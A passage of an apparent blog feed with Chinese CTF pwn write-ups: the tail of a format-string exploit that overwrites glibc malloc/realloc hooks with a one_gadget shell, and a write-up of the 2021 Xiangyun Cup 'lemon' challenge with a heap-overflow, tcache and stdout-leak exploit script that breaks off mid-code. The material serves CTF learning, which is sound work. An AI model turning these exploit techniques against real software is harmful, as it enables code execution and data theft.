class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'say ? '</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span> iadd<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token string">"aaa"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>fake_size <span class="token operator">=</span> <span class="token number">0x00</span>fmt <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>addr <span class="token operator">+</span> <span class="token number">74</span><span class="token punctuation">:</span> fake_size<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>write_size<span class="token operator">=</span><span class="token string">'short'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"fmtstr_payload ==> "</span><span class="token punctuation">,</span>fmtsay<span class="token punctuation">(</span>fmt<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content: '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>main_arena_248 <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> main_arena_248 <span class="token operator">-</span> <span class="token number">248</span> <span class="token operator">-</span> <span class="token number">0x10</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base : "</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baserealloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__realloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baserealloc <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseone_gadget <span class="token operator">=</span> <span class="token number">0x4527a</span> <span class="token operator">+</span> libc_baselog<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"one_gadget : "</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>realloc_offset <span class="token operator">=</span> realloc <span class="token operator">+</span> <span class="token number">12</span><span class="token comment"># realloc_hook ==> one_gadget</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>data <span class="token operator">=</span> one_gadget<span class="token operator">&amp;</span><span class="token number">0xff</span>fmt <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>realloc_hook <span class="token operator">+</span> i<span class="token punctuation">:</span> data <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>write_size<span class="token operator">=</span><span class="token string">'byte'</span><span class="token punctuation">)</span>say<span class="token punctuation">(</span>fmt<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span>data <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># include "\n"</span>one_gadget <span class="token operator">=</span> one_gadget <span class="token operator">>></span> <span class="token number">8</span> <span class="token comment">#右移2个位，相当于除以0x100</span><span class="token comment"># malloc_hook ==> realloc+12</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>data <span class="token operator">=</span> realloc_offset<span class="token operator">&amp;</span><span class="token number">0xff</span>fmt <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>malloc_hook <span class="token operator">+</span> i<span class="token punctuation">:</span> data <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>write_size<span class="token operator">=</span><span class="token string">'byte'</span><span class="token punctuation">)</span>say<span class="token punctuation">(</span>fmt<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span>data <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># include "\n"</span>realloc_offset <span class="token operator">=</span> realloc_offset <span class="token operator">>></span> <span class="token number">8</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'10'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x4527a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>修改stdout结构泄露libc</p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>在printf处下断点，发现在偏移为7的地方指向stdout结构体（有概率出现，不知道为啥。。）</p><p>利用%7$s修改stdout结构体泄露libc</p><h2 id="JigSaw’sCage"><a href="#JigSaw’sCage" class="headerlink" title="JigSaw’sCage"></a>JigSaw’sCage</h2>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-2021祥云杯lemon</title>
      <link href="//post/pwn-2021%E7%A5%A5%E4%BA%91%E6%9D%AFlemon.html"/>
      <url>//post/pwn-2021%E7%A5%A5%E4%BA%91%E6%9D%AFlemon.html</url>
      
        <content type="html"><![CDATA[<h1 id="2021祥云杯-lemon"><a href="#2021祥云杯-lemon" class="headerlink" title="2021祥云杯 lemon"></a>2021祥云杯 lemon</h1><span id="more"></span><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在第一个game里，使得条件成立可以将flag放到栈上，同时打印栈上name的地址后三位</p><p>第二个game里的color功能存在堆溢出，不过只能使用一次，同时bss段上的一个指针存放idx =0，1，2的3个0x30的chunk的地址，我把这些0x30称之为信息chunk，每个信息chunk里在放入真正存放数据的chunk以及申请这个chunk时输入的size，同时还设置了一个inuse位。eat功能会打印堆地址（1/2的概率成功，否则直接退出）</p><p>同时在malloc的时候，虽然存在tcache，但是源码自己写了个检查size位的函数来验证申请的区块。</p><p>由于开启了seccomp禁用了system，所以没法构造one_gadget，但是不管咋样肯定要先泄露libc基地址</p><p>开始时输入yes进入game1</p><p>game1可以将flag读取到栈上，为了满足条件，本来是想本地写个脚本爆破的，结果爆破不出来，但是被试出来了，试出来的 。。。</p><p>lucky_num = FFFF </p><p>但是看源码那么多HIDWORD感觉这么短不应该啊，但是远程试一下也确实可以，玄学问题（</p><p>libc版本为2.26，存在tcache</p><p>首先申请一个和tcache_perthread_struct大小一样的chunk，之后利用eat来得到该chunk的后4位（两个字节）</p><p>利用color功能的溢出，修改该区块信息chunk内的地址，修改后4位（两个字节，主要是修改后三位，倒数第四位利用eat泄露的地址）使它指向tcache_perthread_struct（堆块的最前面）。</p><p>之后释放申请即可得到指向tcache_perthread_struct的chunk，修改tcache_perthread_struct内容以修改tcache 上bins的数目，主要是往里面填一个0x07以使得elf判断tcache bins已满从而释放到unsorted bin 。</p><p>再将这个大chunk释放即可得到unsorted bin。</p><p>由于tcache_perthread_struct不仅保存bins的个数，同时保存他们的头指针，之后只要再在通过再申请小chunk的方式切割在tcache_perthread_struct中的unsortedbin来使得被切割的fd或者bk可以作为某大小bins的头指针（主要是希望写入0x70的位置，因为0x7f作为size位好找也好构造，不过这题没法构造就是了）。</p><p>同时再申请一个0x68的chunk（为了有0x71的size），利用输入lemon名字的机会修改残留的unsorted bin的bk的后两位到stdout稍微考前一点的位置(构造size位 )( gdb动态调试找)，就有1/16的几率可以在stdout附近申请出来一个可编辑的chunk，即可修改stdout的内容。</p><p>将&lt;_IO_2_1_stdout_&gt;的  _flags  改为0xfbad1800，由于默认_IO_write_base和_IO_write_end相同，修改_IO_write_base 的最后两位改成00，即可输出&lt;_IO_2_1_stdout_&gt;中的部分内容（从00到_IO_write_end），其内容都是真实地址，减去偏移即可获得libc基地址。</p><p>之后一开始的思路其实是修改free hook 然后SROP写orw一把梭，但是free hook上面太干净没有size位，同时也够造不出unsorted bin Attack来踩出0x7F，之后考虑到flag被存放在栈上且控制了stdout可以任意地址输出，则利用stdout输出environ内容来泄露栈地址</p><p>我本地使用的libc版本和远程不太一样，且给的libc文件去了符号表，所以environ的偏移是通过先远程打出前面泄露&lt;_IO_2_1_stdout_&gt;的地址，然后在<a href="https://libc.blukat.me/">libcSearcher</a>网站上在线搜到的，远程具体偏移因该是 0x03dd058。</p><p>同样的修改 _flags ，_IO_write_base和_IO_write_end，从environ的地址开始读，只要读出一个栈上的地址就行，所以我这里选择从environ到environ+0x10。</p><p>有了栈地址之后利用第一个game里的name的地址后三位即可找到flag所在的大致位置，再次利用stdout输出即可得到flag。</p><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">import</span> syscontext<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># p = process("./lemon_pwn")</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"47.104.70.90"</span><span class="token punctuation">,</span> <span class="token number">34524</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.26.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">chioce</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>>"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> name<span class="token punctuation">,</span> size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    chioce<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index of your lemon:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name your lemon:"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"of message for you lemon: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Leave your message:"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_err</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> name<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    chioce<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index of your lemon:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name your lemon:"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"of message for you lemon: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">eat</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    chioce<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"eat eat eat "</span><span class="token punctuation">)</span>        ret <span class="token operator">=</span>  <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        heap_addr <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span>        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"heap_addr : "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> ret    <span class="token keyword">except</span><span class="token punctuation">:</span>        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>execv<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">throw</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    chioce<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">color</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    chioce<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span>yes<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> yes<span class="token punctuation">:</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"game with me?"</span><span class="token punctuation">,</span><span class="token string">"yes"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"your lucky number:"</span><span class="token punctuation">,</span><span class="token string">"FFFF"</span><span class="token punctuation">)</span>         p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Wow, you get a reward now!"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name first:"</span><span class="token punctuation">,</span><span class="token string">"mark"</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your reward is "</span><span class="token punctuation">)</span>        ret <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"stack_name_addr :"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>ret<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ret<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"game with me?"</span><span class="token punctuation">,</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> init<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    get<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"mark"</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span><span class="token string">"aaaaaaa"</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>        low_addr  <span class="token operator">=</span>  <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>eat<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        low_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>low_addr<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>        low_addr <span class="token operator">*=</span> <span class="token number">0x10</span>     <span class="token keyword">except</span><span class="token punctuation">:</span>        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>execv<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span>    color<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100000250</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x10"</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>low_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    get<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"hacker"</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x7000000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># tcache_perthread_strcut</span>    throw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"pad1"</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x03</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment"># 3 times to stdout</span>     get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\xed\x36'</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 0x70 tcache chunk</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>        get<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"stdout"</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>        <span class="token comment"># gdb.attach(p)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>execv<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f\x00\x00"</span><span class="token punctuation">)</span>    addr  <span class="token operator">=</span>  u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"_IO_2_1_stdout_+131 : "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span>  addr <span class="token operator">-</span><span class="token number">131</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base : "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># gdb.attach(p)</span>        malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>    free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"malloc_hook : "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"free_hook : "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#throw(1)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index of your lemon : '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    environ <span class="token operator">=</span> libc_base <span class="token operator">+</span>  <span class="token number">0x03dd058</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"environ : "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 